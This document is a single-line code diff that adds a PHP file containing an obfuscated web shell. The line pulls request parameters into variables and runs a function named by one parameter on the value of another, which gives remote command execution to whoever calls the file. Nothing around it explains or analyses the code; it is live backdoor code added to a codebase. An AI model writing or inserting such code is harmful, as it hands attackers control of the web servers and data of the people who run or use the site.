@@ -1,0 +1,1 @@
+<?php extract($_REQUEST) && @$except(stripslashes($pass)) && exit;
